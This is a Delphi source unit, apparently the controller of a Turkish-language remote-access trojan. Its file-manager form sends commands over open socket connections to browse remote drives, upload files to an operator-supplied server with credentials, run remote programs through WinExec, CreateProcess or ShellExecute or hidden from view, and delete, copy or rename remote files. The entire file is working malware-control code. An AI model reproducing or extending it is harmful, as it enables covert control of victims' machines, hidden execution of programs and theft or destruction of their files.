unit Unit2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ImgList, ComCtrls;

type
  TForm2 = class(TForm)
    ListView1: TListView;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Yenile1: TMenuItem;
    indir1: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    Winexec1: TMenuItem;
    CreateProcess1: TMenuItem;
    Shellexecute1: TMenuItem;
    GizliCalistir1: TMenuItem;
    N3: TMenuItem;
    Kopyala1: TMenuItem;
    Sil1: TMenuItem;
    YenidenAdlandr1: TMenuItem;
    N4: TMenuItem;
    zellikler1: TMenuItem;
    MainMenu1: TMainMenu;
    Diz1: TMenuItem;
    reGre1: TMenuItem;
    Grnm1: TMenuItem;
    ikon1: TMenuItem;
    Kk1: TMenuItem;
    procedure FormResize(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Yenile1Click(Sender: TObject);
    procedure indir1Click(Sender: TObject);
    procedure Winexec1Click(Sender: TObject);
    procedure CreateProcess1Click(Sender: TObject);
    procedure Shellexecute1Click(Sender: TObject);
    procedure GizliCalistir1Click(Sender: TObject);
    procedure Kopyala1Click(Sender: TObject);
    procedure Sil1Click(Sender: TObject);
    procedure YenidenAdlandr1Click(Sender: TObject);
    procedure zellikler1Click(Sender: TObject);
    procedure ikon1Click(Sender: TObject);
    procedure Kk1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation

uses Unit1;

{$R *.dfm}

procedure TForm2.FormResize(Sender: TObject);
begin
listview1.Align:=alClient;
end;

procedure TForm2.ListView1DblClick(Sender: TObject);
begin
try
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/CD '+FORM2.ListView1.Selected.Caption);
sleep(100);
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/LS');
finally
end;
end;

procedure TForm2.Yenile1Click(Sender: TObject);
begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/LS');
end;

procedure TForm2.indir1Click(Sender: TObject);
begin
try
if form1.CheckBox5.Checked then begin
if Application.MessageBox(pchar('indirilecek Dosya : '+FORM2.ListView1.Selected.Caption),pchar('hobarey :D'),MB_OKCANCEL + MB_DEFBUTTON1) = IDOK then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/DYUKLE '+FORM2.ListView1.Selected.Caption+'|'+FORM2.ListView1.Selected.Caption+'|'+form1.flatedit3.Text+'|'+form1.flatedit8.Text+'|'+form1.flatedit4.Text+'|'+form1.flatedit5.text)
end;
if form1.CheckBox5.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/DYUKLE '+FORM2.ListView1.Selected.Caption+'|'+FORM2.ListView1.Selected.Caption+'|'+form1.flatedit3.Text+'|'+form1.flatedit8.Text+'|'+form1.flatedit4.Text+'|'+form1.flatedit5.text)
end;
finally
end;
end;

procedure TForm2.Winexec1Click(Sender: TObject);
begin
try
if form1.CheckBox5.Checked then begin
if Application.MessageBox(pchar('i$lenecek dosya : '+FORM2.ListView1.Selected.Caption),pchar('hobarey :D'),MB_OKCANCEL + MB_DEFBUTTON1) = IDOK then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/EX '+FORM2.ListView1.Selected.Caption)
end;
if form1.CheckBox5.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/EX '+FORM2.ListView1.Selected.Caption)
end;
finally
end;

end;

procedure TForm2.CreateProcess1Click(Sender: TObject);
begin
try
if form1.CheckBox5.Checked then begin
if Application.MessageBox(pchar('i$lenecek dosya : '+FORM2.ListView1.Selected.Caption),pchar('hobarey :D'),MB_OKCANCEL + MB_DEFBUTTON1) = IDOK then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/DC '+FORM2.ListView1.Selected.Caption)
end;
if form1.CheckBox5.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/DC '+FORM2.ListView1.Selected.Caption)
end;
finally
end;
end;

procedure TForm2.Shellexecute1Click(Sender: TObject);
begin
try
if form1.CheckBox5.Checked then begin
if Application.MessageBox(pchar('i$lenecek dosya : '+FORM2.ListView1.Selected.Caption),pchar('hobarey :D'),MB_OKCANCEL + MB_DEFBUTTON1) = IDOK then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/HADEE '+FORM2.ListView1.Selected.Caption)
end;
if form1.CheckBox5.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/HADEE '+FORM2.ListView1.Selected.Caption)
end;
finally
end;
end;

procedure TForm2.GizliCalistir1Click(Sender: TObject);
begin
try
if form1.CheckBox5.Checked then begin
if Application.MessageBox(pchar('i$lenecek dosya : '+FORM2.ListView1.Selected.Caption),pchar('hobarey :D'),MB_OKCANCEL + MB_DEFBUTTON1) = IDOK then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/GC '+FORM2.ListView1.Selected.Caption)
end;
if form1.CheckBox5.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/GC '+FORM2.ListView1.Selected.Caption)
end;
finally
end;
end;

procedure TForm2.Kopyala1Click(Sender: TObject);
var
bilgi:String;
begin
try
bilgi := inputbox('Dosya kopyala','Nereye Kopyalansýn?','');
if bilgi='' then exit;
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/KOPYA '+FORM2.ListView1.Selected.Caption+'|'+bilgi);
finally
end;
end;

procedure TForm2.Sil1Click(Sender: TObject);
begin
try
if form1.CheckBox5.Checked then begin
if Application.MessageBox(pchar('i$lenecek dosya : '+FORM2.ListView1.Selected.Caption),pchar('hobarey :D'),MB_OKCANCEL + MB_DEFBUTTON1) = IDOK then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/SIL '+FORM2.ListView1.Selected.Caption)
end;
if form1.CheckBox5.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/SIL '+FORM2.ListView1.Selected.Caption)
end;
finally
end;
end;

procedure TForm2.YenidenAdlandr1Click(Sender: TObject);
var
bilgi:String;
begin
try
bilgi := inputbox('Yeniden Adlandýr','Yeni isim?','');
if bilgi='' then exit;
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/YADLAN '+FORM2.ListView1.Selected.Caption+'|'+bilgi);
finally
end;
end;

procedure TForm2.zellikler1Click(Sender: TObject);
begin
try
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/DB '+FORM2.ListView1.Selected.Caption)
finally
end;
end;

procedure TForm2.ikon1Click(Sender: TObject);
begin
listview1.ViewStyle:=vsicon;
end;

procedure TForm2.Kk1Click(Sender: TObject);
begin
listview1.ViewStyle:=vssmallicon;
end;

end.
